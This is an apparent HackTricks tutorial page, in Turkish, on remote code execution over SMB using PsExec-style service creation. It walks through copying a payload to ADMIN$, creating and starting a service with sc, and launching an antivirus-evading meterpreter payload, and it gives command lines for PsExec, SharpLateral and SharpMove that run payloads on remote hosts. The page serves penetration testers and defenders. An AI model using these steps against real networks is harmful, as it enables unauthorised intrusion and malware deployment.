# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Nasıl çalışırlar

Süreç, aşağıdaki adımlarda özetlenmiştir ve SMB üzerinden hedef makinede uzaktan yürütme sağlamak için hizmet ikililerinin nasıl manipüle edildiğini göstermektedir:

1. **Bir hizmet ikilisinin ADMIN$ paylaşımına SMB üzerinden kopyalanması** gerçekleştirilir.
2. **Uzaktaki makinede bir hizmetin oluşturulması**, ikili dosyaya işaret edilerek yapılır.
3. Hizmet **uzaktan başlatılır**.
4. Çıkışta, hizmet **durdurulur ve ikili dosya silinir**.

### **PsExec'i Manuel Olarak Çalıştırma Süreci**

Antivirüs tespitinden kaçınmak için msfvenom ile oluşturulmuş ve Veil kullanılarak obfuscate edilmiş bir yürütülebilir yük (payload) olduğunu varsayalım, 'met8888.exe' adında, bir meterpreter reverse_http yükünü temsil eden, aşağıdaki adımlar izlenir:

- **İkili dosyanın kopyalanması**: Yürütülebilir dosya, bir komut istemcisinden ADMIN$ paylaşımına kopyalanır, ancak dosya sisteminde gizli kalmak için herhangi bir yere yerleştirilebilir.
- İkili dosyayı kopyalamak yerine, doğrudan argümanlardan komutları yürütmek için `powershell.exe` veya `cmd.exe` gibi bir LOLBAS ikilisi kullanmak da mümkündür. Örneğin, `sc create [ServiceName] binPath= "cmd.exe /c [PayloadCommand]"`
- **Bir hizmet oluşturma**: Windows `sc` komutunu kullanarak, uzaktan Windows hizmetlerini sorgulama, oluşturma ve silme imkanı sağlar, yüklenen ikili dosyaya işaret eden "meterpreter" adında bir hizmet oluşturulur.
- **Hizmeti başlatma**: Son adım, hizmetin başlatılmasıdır; bu, ikili dosyanın gerçek bir hizmet ikilisi olmaması ve beklenen yanıt kodunu döndürmemesi nedeniyle muhtemelen bir "zaman aşımı" hatası ile sonuçlanacaktır. Bu hata önemsizdir çünkü asıl hedef ikilinin yürütülmesidir.

Metasploit dinleyicisinin gözlemlenmesi, oturumun başarıyla başlatıldığını gösterecektir.

[sc komutu hakkında daha fazla bilgi edinin](https://technet.microsoft.com/en-us/library/bb490995.aspx).

Daha ayrıntılı adımları bulabilirsiniz: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

- Ayrıca **Windows Sysinternals ikilisi PsExec.exe** kullanabilirsiniz:

![](<../../images/image (928).png>)

Veya webddav üzerinden erişebilirsiniz:
```bash
\\live.sysinternals.com\tools\PsExec64.exe -accepteula
```
- Ayrıca [**SharpLateral**](https://github.com/mertdas/SharpLateral) kullanabilirsiniz:
```bash
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- Ayrıca [**SharpMove**](https://github.com/0xthirteen/SharpMove) kullanabilirsiniz:
```bash
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- **Impacket'in `psexec` ve `smbexec.py`**'sini de kullanabilirsiniz. 

{{#include ../../banners/hacktricks-training.md}}
